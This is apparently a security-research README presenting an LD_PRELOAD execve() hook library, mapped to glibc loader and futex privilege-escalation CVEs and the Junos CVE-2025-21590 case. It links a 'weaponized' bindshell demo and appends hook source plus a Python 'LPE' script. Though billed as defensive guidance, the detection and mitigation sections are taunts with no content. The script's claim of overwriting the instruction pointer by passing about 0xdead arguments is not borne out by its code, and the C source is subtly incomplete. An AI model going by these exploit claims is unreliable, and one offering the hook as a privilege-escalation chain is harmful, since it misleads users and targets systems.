# Captain Hook — `execve()` LD_PRELOAD Hook: Analysis, CVE Mapping, and Defensive Guidance

## Intent
This document provides a **technical and defensive explanation** of an `LD_PRELOAD`-style `execve()` interposition library.  
It explains how this technique maps to public vulnerability classes particularly **dynamic loader / glibc (ld.so)** and **kernel futex synchronization issues** and how these concepts relate to the **UNC3886 / CVE‑2025‑21590** Junos kernel case.  

It is written for **researchers, defenders, and security engineers** to understand the defensive implications of userland process‑hooking and kernel compartmentalization bugs.  
It is for educational, analytical, and mitigation purposes only.

## Weaponized Demo

[Chain it into a BindShell](./ExploitDemo_SO.mp4)


---

## 1. Code Overview

### Purpose
The code is a shared object meant to be preloaded into a process using `LD_PRELOAD`.  
It overrides the `execve()` function to log and synchronize execution of binaries — particularly when the target binary’s filename contains the substring `"passwd"`.

### Mechanism Summary
1. **Symbol Interposition:**  
   The code uses `dlsym(RTLD_NEXT, "execve")` to dynamically locate the original system call implementation.  
   This allows the custom library to intercept and wrap the behavior of `execve()`.

2. **Conditional Execution:**  
   It checks if the binary being executed contains `"passwd"`.  
   When true, it prints diagnostic messages and uses futexes for synchronization.

3. **Futex Synchronization:**  
   `syscall(SYS_futex, ...)` is invoked for `FUTEX_WAIT` and `FUTEX_WAKE` operations.  
   This mimics multithreaded synchronization primitives but can also expose kernel-level futex paths, historically relevant to local privilege escalations.

4. **Delegation:**  
   After its checks, it invokes the original `execve()` to continue normal execution.

---

## 2. LD_PRELOAD: The Broader Risk Context

`LD_PRELOAD` allows an environment variable to specify extra shared libraries to load before others.  
When misused or honored by privileged binaries (such as **setuid root** executables), it can lead to **local privilege escalation**.

### Legitimate Use
- Profiling, debugging, or tracing system calls.
- Controlled redirection of function calls in sandboxed environments.

### Security Risk
user to root privileges: a user can preload a malicious library that alters system calls or spawns privileged, root, shells.

---

## 3. CVE Class Mapping

### A. Dynamic Loader / glibc Environment Handling

**Relevant CVE Class:**  
Improper handling of loader environment variables in privileged contexts.

**Representative Examples:**
- **CVE‑2023‑4911** — GNU C Library (`ld.so`) overflow in `GLIBC_TUNABLES`, allowing local privilege escalation.  
- Prior glibc loader issues where `LD_PRELOAD`, `LD_LIBRARY_PATH`, or `LD_AUDIT` were honored by privileged binaries.  

**Why It Relates:**  
The interposed `execve()` function is exactly the type of function that would be abused if a privileged process inadvertently honored `LD_PRELOAD`.  
The hook can execute arbitrary code before the original binary runs, inheriting the binary’s privileges.

---

### B. Futex / Kernel Synchronization Vulnerabilities

**Relevant CVE Class:**  
Kernel-level futex implementation flaws that allow race conditions or arbitrary memory access.

**Representative Examples:**
- **CVE‑2020‑14381** — Linux kernel futex requeue flaw leading to privilege escalation.  
- **CVE‑2014‑3153** — The historic futex_requeue bug exploited for local root on Android and Linux systems.

**Why It Relates:**  
The code calls `SYS_futex` directly. While here used for benign synchronization, the syscall path has been abused in many LPE exploits.  
This demonstrates how userland code interacting with futexes can be part of an escalation chain if the kernel is vulnerable.

---

### C. Junos / UNC3886 Case Study (CVE‑2025‑21590)

**Vulnerability:**  
“Improper Isolation or Compartmentalization” flaw in Juniper Junos OS kernel.  
A local attacker with shell access could inject code into trusted processes, bypassing Juniper’s **Veriexec** integrity system.

**Threat Actor:**  
UNC3886 — a China nexus espionage group known for process injection into router and virtualization platforms.

**Connection to the LD_PRELOAD Pattern:**  
While the Junos vulnerability is a kernel flaw, the attacker behavior mirrors the interposition concept:
- Injecting or attaching to trusted processes.
- Executing untrusted code within legitimate contexts.
- Bypassing on-disk integrity checks by executing in memory.


---

## 4. Defensive and Analytical Takeaways

Noneya, at least from me.  Eye for an Eye.

### Detection
- I don't know, be creative, you can figrue this out.

### Mitigation
- You're gonna have to try harder for me to fall into this trap.

---

## 5. Safe Simulation Practices

When testing My Little Pwny or similar LD_PRELOAD simulations:

1. **Isolate the lab environment.**  
   Never preload hooks into production or externally reachable binaries.
2. **Use disposable VMs or containers.**  
   Always snapshot before testing and revert afterward.
3. **Instrument everything.**  
   Capture logs, syscalls, and telemetry to evaluate detection coverage.

---

# Appendix

## CaptainHook.c
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <dlfcn.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <linux/futex.h>
#include <sys/time.h>
#include <errno.h>

static int (*original_execve)(const char *filename, char *const argv[], char *const envp[]) = NULL;

// Futex implementation for synchronization
static int futex_wait(volatile int *addr, int val) {
    return syscall(SYS_futex, addr, FUTEX_WAIT, val, NULL, NULL, 0);
}

static int futex_wake(volatile int *addr) {
    return syscall(SYS_futex, addr, FUTEX_WAKE, 1, NULL, NULL, 0);
}

// Hooked execve function
int execve(const char *filename, char *const argv[], char *const envp[]) {
    static volatile int futex_value = 0;
    
    // Lazy-load the original execve function
    if (!original_execve) {
        original_execve = dlsym(RTLD_NEXT, "execve");
        if (!original_execve) {
            fprintf(stderr, "Error: Failed to locate original execve\n");
            exit(EXIT_FAILURE);
        }
    }

    // Ensure we are executing passwd
    if (filename && strstr(filename, "passwd")) {
        printf("[HOOK] Intercepted execve: %s\n", filename);

        // Use futex to synchronize before continuing execution
        futex_value = 1;
        futex_wake(&futex_value);
        futex_wait(&futex_value, 1);

        // Print safely after futex is released
        printf("[HOOK] Executing original execve for: %s\n", filename);
    }

    // Call original execve function
    return original_execve(filename, argv, envp);
}

```

## How to use PopLockAndDropIt.py
```bash
# Futex definitely pops into the ip register locks up, and drops a core, hence, Pop Lock and Drop it! 

compiled against ubuntu linux kernel 5.10.xxx and up at time of writing (10/18/2025)


<pre>
python3 ./pop_lock_and_drop_it.py
</pre>

Then read the output in dmesg

<pre>
sudo dmesg | tail -10
</pre>

and you'll see a small core dump and ip=0x00000dead blah blah alluding to it.


meh, it was a start and hopefully it'll help out someone in the future.

Cheers,

Blake Drizzle

```

## PopLockAndDropIt.py (LPE portion) to arbitrarly overwrite the Instruction Pointer
```python
#!/bin/python3

import subprocess
arguments = ["./captain_hook_poc.so"]
for _ in  range(0, 0xdead - 1):
    arguments.append(str(int(_)))


print(f"dmesg should have ip = {hex(len(arguments) )}")
subprocess.run(arguments)
print("[+] DONE")

```
**© 2025 Blake De Garza — ( Captain Hook — `execve()` LD_PRELOAD Hook: Analysis, CVE Mapping, and Defensive Guidance)**